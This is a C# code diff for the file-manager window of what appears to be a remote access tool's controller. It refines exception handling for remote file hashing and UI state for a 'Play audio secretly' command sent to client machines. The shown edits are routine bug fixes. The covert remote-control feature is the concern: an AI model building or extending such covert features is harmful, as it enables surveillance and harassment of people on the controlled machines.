@@ -618,11 +618,17 @@ public partial class FileManagerWindow : ThemedWindow
                 ServerWindow.LogGlobal($"[FM] Hash computation failed for '{path}' on client {_clientId}: {err}");
             }
         }
-        catch (Exception ex)
+        catch (TimeoutException)
         {
             TxtStatus.Text = Lang.Get("FM_HASH_TIMEOUT");
             ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
-            ServerWindow.LogGlobal($"[FM] Hash computation failed/timed out for '{path}' on client {_clientId}: {ex.Message}");
+            ServerWindow.LogGlobal($"[FM] Hash computation timed out for '{path}' on client {_clientId}.");
+        }
+        catch (Exception ex)
+        {
+            TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
+            ServerWindow.ReportGlobalActivity("Hash failed", row.Name, "failed");
+            ServerWindow.LogGlobal($"[FM] Hash computation failed for '{path}' on client {_clientId}: {ex.Message}");
         }
         finally { _pendingHash = null; }
     }
@@ -926,6 +932,8 @@ public partial class FileManagerWindow : ThemedWindow
         ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "running");
         ServerWindow.LogGlobal($"[FM] Playing audio secretly '{path}' on client {_clientId}...");
 
+        _isPlayingAudio = true;
+        MnuFmPlayMusicSecret.Header = Lang.Get("FM_STOP_AUDIO");
         try
         {
             await _server.SendToClient(_clientId, new Packet
@@ -933,13 +941,13 @@ public partial class FileManagerWindow : ThemedWindow
                 Type = PacketType.FmPlayAudio,
                 Data = JsonConvert.SerializeObject(new FmPlayAudioData { Path = path })
             });
-            _isPlayingAudio = true;
-            MnuFmPlayMusicSecret.Header = Lang.Get("FM_STOP_AUDIO");
             TxtStatus.Text = string.Format(Lang.Get("FM_PLAYING_SILENT"), row.Name);
             ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "complete");
         }
         catch (Exception ex)
         {
+            _isPlayingAudio = false;
+            MnuFmPlayMusicSecret.Header = Lang.Get("FM_PLAY_MUSIC_SECRET");
             TxtStatus.Text = string.Format(Lang.Get("ERR_GENERIC"), ex.Message);
             ServerWindow.ReportGlobalActivity("Play audio secretly", row.Name, "failed");
         }
